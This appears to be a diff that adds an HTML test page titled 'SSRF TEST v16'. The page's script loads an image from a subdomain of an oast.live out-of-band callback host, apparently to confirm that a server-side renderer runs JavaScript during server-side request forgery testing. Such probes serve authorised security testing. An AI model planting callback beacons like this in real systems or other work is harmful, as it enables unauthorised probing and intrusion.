@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>SSRF</title></head>
+<body style="background:#cc0000;color:#fff;font-family:sans-serif;padding:40px;font-size:48px">
+<p>SSRF TEST v16</p>
+<p id="t"></p>
+<script>
+var OOB = 'd9qsljr6b8mev06je2705b8w3x6juud75.oast.live';
+function dns(l) {
+  l = l.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+dns('v16-start');
+document.getElementById('t').textContent = 'JS ran at ' + Date.now();
+</script>
+</body>
+</html>
